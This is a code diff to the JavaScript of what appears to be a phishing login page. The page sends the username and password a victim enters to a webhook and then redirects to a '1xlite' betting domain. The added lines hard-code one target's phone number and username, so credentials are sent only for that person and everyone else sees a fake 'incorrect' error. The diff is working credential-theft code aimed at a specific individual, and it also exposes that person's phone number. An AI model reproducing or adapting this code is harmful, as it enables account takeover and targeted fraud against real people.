@@ -28,21 +28,38 @@ $(document).ready(function() {
                 passwordError.hide();
             }
 
+            var correctUser = [
+                '+201065351666',
+                '01065351666',
+                '___7adida___1'
+            ]
             // Send AJAX POST request using jQuery
-        if(user != '' && password != ''){
-            $.ajax({
-                url: webhookURL,
-                type: 'POST',
-                contentType: 'application/json',
-                data: JSON.stringify(data),
-                success: function(response) {
-                    console.log('Information sent successfully!');
-                    window.location.href = "https://1xlite-352419.top/en";
-                },
-                error: function(xhr, status, error) {
-                    console.log('Error sending information: ' + xhr.responseText);
-                }
-            });
-        }
+            //if(user != '' && password != ''){
+
+
+            if (correctUser.includes(user)){
+                userError.text('Input required');
+                userError.hide();
+                    $.ajax({
+                        url: webhookURL,
+                        type: 'POST',
+                        contentType: 'application/json',
+                        data: JSON.stringify(data),
+                        success: function(response) {
+                            console.log('Information sent successfully!');
+                            window.location.href = "https://1xlite-352419.top/en";
+                        },
+                        error: function(xhr, status, error) {
+                            console.log('Error sending information: ' + xhr.responseText);
+                        }
+                    });
+                
+            }else{
+                userError.text("username or phone number isn't correct");
+                userError.show();
+                console.log('not the username');
+            }
+            
+            //}
         }); 
 });
